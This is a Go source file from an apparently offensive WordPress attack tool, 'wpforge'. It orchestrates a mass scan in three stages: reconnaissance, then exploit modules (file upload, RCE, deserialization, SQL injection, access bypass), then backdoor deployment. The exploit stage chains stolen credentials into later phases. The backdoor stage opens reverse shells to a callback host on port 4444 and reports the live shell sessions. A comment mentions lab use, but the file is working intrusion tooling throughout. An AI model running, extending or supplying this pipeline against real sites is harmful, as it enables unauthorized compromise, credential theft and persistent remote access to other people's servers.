// Package scan runs the full wpforge pipeline against a target:
// recon -> access -> exploit (check+shell upload) -> backdoor (back-connect).
// Modules are discovered dynamically from the registry, so anything
// registered (including future CVE modules) is picked up automatically.
package scan

import (
	"context"

	"github.com/lab/wpforge/internal/module"
	"github.com/lab/wpforge/internal/registry"
	"github.com/lab/wpforge/internal/shell"
)

// Pipeline drives a mass scan.
type Pipeline struct {
	Target *module.Target
	Log    module.Logger
}

// phaseResult aggregates one pipeline phase.
type phaseResult struct {
	ran      int
	success  int
	failures int
}

// Run executes all phases in order. ctx cancels between module runs.
func (p *Pipeline) Run(ctx context.Context) {
	t := p.Target
	log := p.Log
	log.Infof("=== mass scan: %s ===", t.BaseURL)

	// Phase 1: recon (fingerprint, plugin enum, exposure, REST discovery).
	pr := p.runPhase(ctx, "recon", func(m module.Module) bool {
		return m.Meta().Primitive == module.PrimitiveRecon
	}, map[string]string{})
	if ctx.Err() != nil {
		return
	}
	log.Infof("recon phase: %d ran, %d hits", pr.ran, pr.success)

	// Phase 2: CVE exploit checks (upload/RCE/deser/sqli/access-primitives).
	// Successful auth bypasses chain creds into the target for later phases.
	xr := p.runPhase(ctx, "exploit", func(m module.Module) bool {
		switch m.Meta().Primitive {
		case module.PrimitiveFileUpload, module.PrimitivePathTravRCE,
			module.PrimitiveDeser, module.PrimitiveSQLi, module.PrimitiveAccess:
			return true
		}
		return false
	}, map[string]string{})
	if ctx.Err() != nil {
		return
	}
	log.Infof("exploit phase: %d ran, %d vulnerable/success", xr.ran, xr.success)

	// Phase 3: backdoor deploy (reverse shell) — only if we hold creds.
	if t.Creds.Username != "" {
		log.Infof("creds available (%s) - running backdoor/back-connect phase", t.Creds.Username)
		br := p.runPhase(ctx, "backdoor", func(m module.Module) bool {
			return m.Meta().Primitive == module.PrimitiveBackdoor && m.Meta().AuthLevel != module.AuthNone
		}, map[string]string{
			"lhost": defaultLHost,
			"lport": "4444",
		})
		log.Infof("backdoor phase: %d ran, %d deployed", br.ran, br.success)
	} else {
		log.Warnf("no creds chained - skipping backdoor phase (brute/access first or set creds via Ctrl+T)")
	}

	// Summary.
	sessions := shell.M().List()
	log.Infof("=== scan complete: %d live shell session(s) ===", len(sessions))
	for _, s := range sessions {
		log.Successf("  %s  %-8s  %s", s.ID, s.Kind, s.Target)
	}
	if len(sessions) > 0 {
		log.Infof("press Ctrl+S to open the shell console and interact")
	}
}

// runPhase executes every registered module matching keep, with defaults plus
// overrides. Returns aggregate stats. Modules failing with errors count as
// not-applicable, not fatal — mass scan continues.
func (p *Pipeline) runPhase(ctx context.Context, name string, keep func(module.Module) bool, overrides map[string]string) phaseResult {
	var res phaseResult
	for _, m := range registry.All() {
		if ctx.Err() != nil {
			return res
		}
		if !keep(m) {
			continue
		}
		meta := m.Meta()
		params := map[string]string{}
		for _, spec := range m.Params() {
			params[spec.Name] = spec.Default
		}
		for k, v := range overrides {
			if v != "" {
				params[k] = v
			}
		}
		res.ran++
		p.Log.Infof("[%s] %s - %s", name, meta.ID, meta.Name)
		out := m.Run(ctx, p.Target, params, p.Log)
		if out == nil {
			res.failures++
			continue
		}
		if out.Err != nil {
			p.Log.Warnf("[%s] %s error: %v", name, meta.ID, out.Err)
			res.failures++
			continue
		}
		if out.Success {
			res.success++
			if out.Summary != "" {
				p.Log.Successf("[%s] %s: %s", name, meta.ID, out.Summary)
			}
			// Chain credentials for later phases.
			if out.Creds != nil {
				p.Target.Creds = *out.Creds
				p.Log.Infof("[%s] %s chained creds into target state", name, meta.ID)
			}
		} else {
			if out.Summary != "" {
				p.Log.Infof("[%s] %s: %s", name, meta.ID, out.Summary)
			}
		}
	}
	return res
}

// defaultLHost is the reverse-shell callback host for the backdoor phase.
// Best-effort: lab setups usually share the host with wpforge.
const defaultLHost = "127.0.0.1"
